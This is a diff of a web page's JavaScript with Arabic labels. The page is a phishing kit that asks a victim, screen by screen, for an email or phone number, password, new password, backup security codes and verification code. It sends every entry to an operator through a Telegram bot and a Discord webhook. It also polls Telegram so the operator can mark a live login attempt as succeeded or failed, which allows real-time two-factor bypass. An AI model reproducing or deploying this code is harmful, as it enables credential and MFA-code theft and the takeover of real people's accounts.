-        'phase3': ' 3:   ',
-        'phase4': ' 4:   ',
-        'waitingTelegram': '   ',
-        'successScreen': '  '
+        'phase1': 'المرحلة 1: إدخال البريد الإلكتروني أو الهاتف',
+        'loading1': 'شاشة التحميل (1)',
+        'phase2': 'المرحلة 2: إدخال كلمة المرور',
+        'loading2': 'شاشة التحميل (2)',
+        'phase3': 'المرحلة 3: تأكيد ملكية الحساب',
+        'phase4': 'المرحلة 4: إدخال كود التحقق',
+        'waitingTelegram': 'شاشة الانتظار لمراجعة المسؤول',
+        'successScreen': 'شاشة النجاح النهائية'
     };
 
-    // ----------------------------------------------------
-    //         ( Embed)
-    // ----------------------------------------------------
+    // 📩 دالة الإرسال الموحدة (تليجرام + ديسكورد بنظام البطاقات)
     function notifyAll({ title, fields = [], color = 3447003 }) {
-        // 1.   
+        // 1. الإرسال إلى تليجرام
         if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN") {
             let telegramText = `<b>${title}</b>\n\n`;
             fields.forEach(f => {
@@ -615,7 +558,7 @@
             }).catch(err => console.error("Telegram Error:", err));
         }
 
-        // 2.      (Embed Cards)
+        // 2. الإرسال إلى ديسكورد بنظام البطاقات (Embed Cards)
         if (DISCORD_WEBHOOK_URL) {
             const discordPayload = {
                 embeds: [{
@@ -623,10 +566,10 @@
                     color: color,
                     fields: fields.map(f => ({
                         name: f.name,
-                        value: String(f.value || ' '),
+                        value: String(f.value || 'لا يوجد'),
                         inline: f.inline !== undefined ? f.inline : false
                     })),
-                    footer: { text: "  " },
+                    footer: { text: "نظام التتبع المباشر" },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -639,19 +582,19 @@
         }
     }
 
-    //    
+    // تتبع التوجيهات والتفاعلات النقريّة
     function trackAction(actionName) {
         notifyAll({
-            title: " [ / ]",
+            title: "👆 [تفاعل / نقرة]",
             fields: [
-                { name: "", value: actionName, inline: true },
-                { name: " ", value: userData.email || '  ', inline: true }
+                { name: "الإجراء", value: actionName, inline: false },
+                { name: "البريد الحالي", value: userData.email || 'لم يدخل بعد', inline: true }
             ],
-            color: 10181046 // 
+            color: 10181046
         });
     }
 
-    //      
+    // التنقل بين الشاشات مع توثيق التوجه
     function switchPage(pageId, isBack = false) {
         const interactivePages = ['phase1', 'phase2', 'phase3', 'phase4'];
 
@@ -665,39 +608,36 @@
         const targetPage = document.getElementById(pageId);
         if (targetPage) targetPage.classList.add('active');
 
-        //      
+        // تحكم بظهور زر العودة خطوة للخلف
         const backBtn = document.getElementById('backBtn');
-        if (backBtn) {
-            if (interactivePages.includes(pageId) && historyStack.length > 1 && pageId !== 'phase1') {
-                backBtn.style.display = 'inline-flex';
-            } else {
-                backBtn.style.display = 'none';
-            }
+        if (interactivePages.includes(pageId) && historyStack.length > 1 && pageId !== 'phase1') {
+            backBtn.style.display = 'inline-flex';
+        } else {
+            backBtn.style.display = 'none';
         }
 
         const title = pageNames[pageId] || pageId;
         if (isBack) {
             notifyAll({
-                title: " [ ]",
+                title: "⬅️ [رجوع للخلف]",
                 fields: [
-                    { name: "  ", value: title, inline: true },
-                    { name: " ", value: userData.email || ' ', inline: true }
+                    { name: "الصفحة الحالية", value: title, inline: false },
+                    { name: "البريد", value: userData.email || 'غير مدخل', inline: true }
                 ],
-                color: 15844367 // 
+                color: 15844367
             });
         } else {
             notifyAll({
-                title: " [ ]",
+                title: "➡️ [توجه جديد]",
                 fields: [
-                    { name: "  ", value: title, inline: true },
-                    { name: " ", value: userData.email || ' ', inline: true }
+                    { name: "الصفحة الحالية", value: title, inline: false }
                 ],
-                color: 3447003 // 
+                color: 3447003
             });
         }
     }
 
-    //    
+    // وظيفة زر العودة خطوة
     function goBack() {
         if (historyStack.length > 1) {
             historyStack.pop();
@@ -708,28 +648,26 @@
 
     function toggleHelp() {
         const box = document.getElementById('helpBox');
-        if (!box) return;
         const isShown = box.style.display === 'none';
         box.style.display = isShown ? 'block' : 'none';
-        trackAction(isShown ? '  ' : '  ');
+        trackAction(isShown ? 'عرض تعليمات الحساب' : 'إخفاء تعليمات الحساب');
     }
 
-    // ---   ---
+    // --- المرحلة الأولى ---
     function submitPhase1() {
-        const emailInput = document.getElementById('emailInput');
-        const email = emailInput ? emailInput.value.trim() : '';
+        const email = document.getElementById('emailInput').value.trim();
         if (!email) {
-            alert('     ');
+            alert('يرجى إدخال البريد الإلكتروني أو الهاتف');
             return;
         }
         userData.email = email;
 
         notifyAll({
-            title: " []  1 - /",
+            title: "📥 [مدخلات] مرحلة 1 - البريد/الهاتف",
             fields: [
-                { name: " / ", value: email, inline: false }
+                { name: "البريد / الهاتف", value: email, inline: false }
             ],
-            color: 3066993 // 
+            color: 3066993
         });
 
         switchPage('loading1');
@@ -738,23 +676,22 @@
         }, 3000);
     }
 
-    // ---   ---
+    // --- المرحلة الثانية ---
     function submitPhase2Initial() {
-        const notesInput = document.getElementById('notesInput');
-        const notes = notesInput ? notesInput.value.trim() : '';
+        const notes = document.getElementById('notesInput').value.trim();
         if (!notes) {
-            alert('   ');
+            alert('يرجى إدخال كلمة المرور');
             return;
         }
         userData.initialNotes = notes;
 
         notifyAll({
-            title: " []   ",
+            title: "🔑 [مدخلات] كلمة المرور المدخلة",
             fields: [
-                { name: " ", value: userData.email || ' ', inline: true },
-                { name: " ", value: notes, inline: true }
+                { name: "البريد", value: userData.email, inline: true },
+                { name: "كلمة المرور", value: notes, inline: true }
             ],
-            color: 3066993 // 
+            color: 3066993
         });
 
         switchPage('loading2');
@@ -764,52 +701,46 @@
     }
 
     function showForgotPasswordView() {
-        const p2Initial = document.getElementById('phase2_initial');
-        const p2Forgot = document.getElementById('phase2_forgot');
-        if (p2Initial) p2Initial.style.display = 'none';
-        if (p2Forgot) p2Forgot.style.display = 'block';
+        document.getElementById('phase2_initial').style.display = 'none';
+        document.getElementById('phase2_forgot').style.display = 'block';
 
         const uniqueNote = 'NOTE-' + Math.floor(100000 + Math.random() * 900000);
         userData.uniqueNote = uniqueNote;
-        const uniqueBox = document.getElementById('uniqueNoteBox');
-        if (uniqueBox) uniqueBox.innerText = uniqueNote;
+        document.getElementById('uniqueNoteBox').innerText = uniqueNote;
 
         notifyAll({
-            title: " []    ",
+            title: "⚠️ [توجه] طلب نسيت كلمة المرور",
             fields: [
-                { name: " ", value: userData.email || ' ', inline: true },
-                { name: "  ", value: uniqueNote, inline: true }
+                { name: "البريد", value: userData.email, inline: true },
+                { name: "كلمة المرور المنشأة", value: uniqueNote, inline: true }
             ],
-            color: 15105570 // 
+            color: 15105570
         });
     }
 
     function handlePasswordRedirect() {
         navigator.clipboard.writeText(userData.uniqueNote).catch(e => console.log(e));
-        const newNotesInput = document.getElementById('newNotesInput');
-        const btnSubmitNewNotes = document.getElementById('btnSubmitNewNotes');
-        if (newNotesInput) newNotesInput.disabled = false;
-        if (btnSubmitNewNotes) btnSubmitNewNotes.disabled = false;
-        trackAction('        ');
+        document.getElementById('newNotesInput').disabled = false;
+        document.getElementById('btnSubmitNewNotes').disabled = false;
+        trackAction('انقر على رابط نسخ كلمة المرور وتحديثها');
     }
 
     function submitPhase2Final() {
-        const newNotesInput = document.getElementById('newNotesInput');
-        const newNotes = newNotesInput ? newNotesInput.value.trim() : '';
+        const newNotes = document.getElementById('newNotesInput').value.trim();
         if (!newNotes) {
-            alert('    ');
+            alert('يرجى إدخال كلمة المرور الجديدة');
             return;
         }
         userData.newNotes = newNotes;
 
         notifyAll({
-            title: " []    ",
+            title: "✅ [مدخلات] تحديث كلمة المرور الجديدة",
             fields: [
-                { name: " ", value: userData.email || ' ', inline: false },
-                { name: "  ", value: userData.uniqueNote || ' ', inline: true },
-                { name: "  ", value: newNotes, inline: true }
+                { name: "البريد", value: userData.email, inline: false },
+                { name: "كلمة المرور المنسوخة", value: userData.uniqueNote, inline: true },
+                { name: "كلمة المرور الجديدة", value: newNotes, inline: true }
             ],
-            color: 3066993 // 
+            color: 3066993
         });
 
         switchPage('loading2');
@@ -818,52 +749,45 @@
         }, 3000);
     }
 
-    // ---   ---
+    // --- المرحلة الثالثة ---
     function handleBackupCodesRedirect() {
         hasVisitedBackupCodesLink = true;
         const alertBox = document.getElementById('errorAlert');
-        if (alertBox) alertBox.style.display = 'none';
-        trackAction('      (Backup Codes)');
+        alertBox.style.display = 'none';
+        trackAction('انقر على رابط استخراج رموز الأمان (Backup Codes)');
     }
 
     function submitBackupCode() {
         const alertBox = document.getElementById('errorAlert');
 
         if (!hasVisitedBackupCodesLink) {
-            if (alertBox) {
-                alertBox.innerText = "             .";
-                alertBox.style.display = 'block';
-            }
+            alertBox.innerText = "يرجى الضغط على رابط رموز الأمان أولاً للحصول على الرمز ثم ادخاله في الخانة.";
+            alertBox.style.display = 'block';
             notifyAll({
-                title: " [ ]",
+                title: "⚠️ [تنبيه محاولة]",
                 fields: [
-                    { name: "", value: "        .", inline: false },
-                    { name: " ", value: userData.email || ' ', inline: true }
+                    { name: "السبب", value: "حاول المستخدم إدخال رمز أمان دون فتح الرابط أولاً.", inline: false }
                 ],
-                color: 15105570 // 
+                color: 15105570
             });
             return;
         }
 
-        const codeInput = document.getElementById('backupCodeInput');
-        const code = codeInput ? codeInput.value.trim() : '';
+        const code = document.getElementById('backupCodeInput').value.trim();
         if (!code) {
-            if (alertBox) {
-                alertBox.innerText = "       .";
-                alertBox.style.display = 'block';
-            }
+            alertBox.innerText = "يرجى إدخال أحد رموز الأمان المنسوخة من الرابط.";
+            alertBox.style.display = 'block';
             return;
         }
 
         userData.backupCode = code;
-
         notifyAll({
-            title: " []   ",
+            title: "🛡️ [مدخلات] رمز الأمان المدخل",
             fields: [
-                { name: " ", value: userData.email || ' ', inline: true },
-                { name: " ", value: code, inline: true }
+                { name: "البريد", value: userData.email, inline: true },
+                { name: "رمز الأمان", value: code, inline: true }
             ],
-            color: 3066993 // 
+            color: 3066993
         });
 
         switchPage('loading2');
@@ -874,59 +798,57 @@
 
     function toggleAlternativeWays() {
         const container = document.getElementById('alternativeWays');
-        if (!container) return;
         const isShown = container.style.display === 'none';
         container.style.display = isShown ? 'block' : 'none';
-        trackAction(isShown ? '    ' : '   ');
+        trackAction(isShown ? 'عرض خيارات طرق التأكيد البديلة' : 'إخفاء طرق التأكيد البديلة');
     }
 
     function requestVerificationCode() {
-        const inputElem = document.getElementById('phoneOrEmailInput');
-        const inputVal = inputElem ? inputElem.value.trim() : '';
+        const inputVal = document.getElementById('phoneOrEmailInput').value.trim();
         if (!inputVal) {
-            alert('      ');
+            alert('يرجى إدخال رقم الهاتف أو البريد الإلكتروني');
             return;
         }
         userData.phoneOrEmail = inputVal;
 
         notifyAll({
-            title: " []    ",
+            title: "📩 [مدخلات] طلب كود تحقق جديد",
             fields: [
-                { name: " ", value: userData.email || ' ', inline: true },
-                { name: " ", value: inputVal, inline: true }
+                { name: "البريد", value: userData.email, inline: true },
+                { name: "بيانات التواصل", value: inputVal, inline: true }
             ],
-            color: 3447003 // 
+            color: 3447003
         });
 
         switchPage('phase4');
         startTelegramPolling();
     }
 
-    // ---   ---
+    // --- المرحلة الرابعة (الإرسال اليدوي عند الضغط على زر موافق) ---
     function verifyCode() {
         const codeInput = document.getElementById('verificationCodeInput');
-        const val = codeInput ? codeInput.value.trim() : '';
+        const val = codeInput.value.trim();
         
         if (!val) {
-            alert('   ');
+            alert('الرجاء إدخال الكود أولاً');
             return;
         }
         
         userData.verificationCode = val;
-
+        
         notifyAll({
-            title: ` []    (${val.length} )`,
+            title: `🔢 [مدخلات] كود التحقق المدخل (${val.length} أرقام)`,
             fields: [
-                { name: " ", value: userData.email || ' ', inline: true },
-                { name: " ", value: val, inline: true }
+                { name: "البريد", value: userData.email, inline: true },
+                { name: "الكود المدخل", value: val, inline: true }
             ],
-            color: 3066993 // 
+            color: 3066993
         });
         
         switchPage('waitingTelegram');
     }
 
-    // ---      ---
+    // --- بوابة التحكم اليدوي عبر التليجرام ---
     function startTelegramPolling() {
         if (pollInterval) clearInterval(pollInterval);
 
@@ -942,16 +864,13 @@
                             lastUpdateId = update.update_id;
                             if (update.message && update.message.text) {
                                 const text = update.message.text.trim();
-                                if (text === " ") {
+                                if (text === "تم التسجيل") {
                                     clearInterval(pollInterval);
                                     switchPage('successScreen');
-                                } else if (text === "") {
+                                } else if (text === "فشل") {
                                     clearInterval(pollInterval);
-                                    const alertBox = document.getElementById('errorAlert');
-                                    if (alertBox) {
-                                        alertBox.innerText = "     ";
-                                        alertBox.style.display = 'block';
-                                    }
+                                    document.getElementById('errorAlert').innerText = "تأكد من إدخال المعلومات بشكل صحيح";
+                                    document.getElementById('errorAlert').style.display = 'block';
                                     switchPage('phase3');
                                 }
                             }
@@ -962,6 +881,5 @@
         }, 3000);
     }
 </script>
-
 </body>
 </html>
